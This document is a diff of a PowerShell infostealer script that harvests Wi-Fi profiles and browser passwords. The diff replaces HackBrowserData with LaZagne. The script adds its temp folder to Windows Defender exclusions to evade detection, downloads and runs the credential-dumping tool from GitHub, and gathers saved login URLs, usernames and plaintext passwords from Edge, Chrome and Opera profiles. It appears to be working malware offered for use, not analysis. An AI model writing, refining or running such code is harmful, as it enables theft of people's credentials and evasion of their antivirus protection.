@@ -18,117 +18,41 @@ foreach($name in $wifiProfiles) {
 if(-not $wifi) { $wifi = "No WiFi networks found" }
 
 # === Browser Passwords ===
-$tempDir = "$env:TEMP\hbd_$(Get-Random)"
+$tempDir = "$env:TEMP\lz_$(Get-Random)"
 New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
 
 try {
     # Add temp directory to Windows Defender exclusion
     Add-MpPreference -ExclusionPath $tempDir -ErrorAction SilentlyContinue
     
-    # Download HackBrowserData
-    $hbdUrl = "https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.6/hack-browser-data-windows-64bit.zip"
-    $zipPath = "$tempDir\hbd.zip"
+    # Download LaZagne
+    $lazagneUrl = "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe"
+    $exePath = "$tempDir\LaZagne.exe"
     
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-    Invoke-WebRequest -Uri $hbdUrl -OutFile $zipPath -UseBasicParsing
+    Invoke-WebRequest -Uri $lazagneUrl -OutFile $exePath -UseBasicParsing
     
-    # Extract
-    Add-Type -AssemblyName System.IO.Compression.FileSystem
-    [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $tempDir)
+    # Run LaZagne for browsers only (faster)
+    $outputFile = "$tempDir\output.txt"
+    $result = & $exePath browsers -vv 2>&1
     
-    # Run HackBrowserData
-    $exePath = "$tempDir\hack-browser-data.exe"
-    if(Test-Path $exePath) {
-        $browsers = "Debug Info:`n"
-        
-        # Search for browser data directories
-        $localAppData = $env:LOCALAPPDATA
-        $appData = $env:APPDATA
-        
-        # Check all User Data folders
-        $edgePaths = @(
-            "$localAppData\Microsoft\Edge\User Data"
-            "$localAppData\Microsoft\Edge SxS\User Data"
-        )
-        
-        $chromePaths = @(
-            "$localAppData\Google\Chrome\User Data"
-            "$localAppData\Chromium\User Data"
-        )
-        
-        $operaPaths = @(
-            "$appData\Opera Software\Opera Stable"
-            "$appData\Opera Software\Opera GX Stable"
-        )
-        
-        $browsers += "Searching for browsers...`n"
-        
-        # Find Edge profiles
-        foreach($basePath in $edgePaths) {
-            if(Test-Path $basePath) {
-                $profiles = Get-ChildItem -Path $basePath -Directory | Where-Object { $_.Name -match "^(Default|Profile \d+)$" }
-                foreach($profile in $profiles) {
-                    $browsers += "Found Edge: " + $profile.FullName + "`n"
-                    & $exePath -b edge -p $profile.FullName -f json --dir $tempDir 2>&1 | Out-Null
-                }
-            }
-        }
-        
-        # Find Chrome profiles
-        foreach($basePath in $chromePaths) {
-            if(Test-Path $basePath) {
-                $profiles = Get-ChildItem -Path $basePath -Directory | Where-Object { $_.Name -match "^(Default|Profile \d+)$" }
-                foreach($profile in $profiles) {
-                    $browsers += "Found Chrome: " + $profile.FullName + "`n"
-                    & $exePath -b chrome -p $profile.FullName -f json --dir $tempDir 2>&1 | Out-Null
-                }
-            }
-        }
-        
-        # Find Opera profiles
-        foreach($operaPath in $operaPaths) {
-            if(Test-Path $operaPath) {
-                $browsers += "Found Opera: " + $operaPath + "`n"
-                & $exePath -b opera -p $operaPath -f json --dir $tempDir 2>&1 | Out-Null
-            }
-        }
-        
-        Start-Sleep -Seconds 5
-        
-        # List all files created
-        $allFiles = Get-ChildItem -Path $tempDir -Filter "*.json"
-        $browsers += "JSON files found: " + $allFiles.Count + "`n"
-        foreach($f in $allFiles) {
-            $browsers += "  - " + $f.Name + " (" + $f.Length + " bytes)`n"
-        }
-        
-        # Read ALL password JSON files and combine
-        $jsonFiles = Get-ChildItem -Path $tempDir -Filter "*password*.json" -Recurse
-        $passData = ""
-        
-        foreach($jsonFile in $jsonFiles) {
-            try {
-                $content = Get-Content $jsonFile.FullName -Raw
-                $data = $content | ConvertFrom-Json
-                foreach($item in $data) {
-                    $url = if($item.LoginURL) { $item.LoginURL } else { "No URL" }
-                    $user = if($item.UserName) { $item.UserName } else { "" }
-                    $pass = if($item.Password) { $item.Password } else { "" }
-                    
-                    if($pass) {
-                        $passData += "$url`nUser: $user`nPass: $pass`n`n"
-                    }
-                }
-            } catch {
-                $browsers += "Error reading " + $jsonFile.Name + ": " + $_.Exception.Message + "`n"
-            }
-        }
-        
-        if($passData) {
-            $browsers = $passData
-        }
-    } else {
-        $browsers = "Failed to extract HackBrowserData"
+    $browsers = "LaZagne Output:`n"
+    $browsers += $result | Out-String
+    $browsers += "`n`nLooking for JSON files...`n"
+    
+    # Check what files were created
+    $allFiles = Get-ChildItem -Path $tempDir
+    foreach($file in $allFiles) {
+        $browsers += "Found: " + $file.Name + "`n"
+    }
+    
+    # Try to read any JSON output
+    $jsonFile = Get-ChildItem -Path $tempDir -Filter "*.json" -ErrorAction SilentlyContinue | Select-Object -First 1
+    
+    if($jsonFile) {
+        $browsers += "`nReading JSON file...`n"
+        $content = Get-Content $jsonFile.FullName -Raw
+        $browsers += $content
     }
 } catch {
     $browsers = "Error: $($_.Exception.Message)"
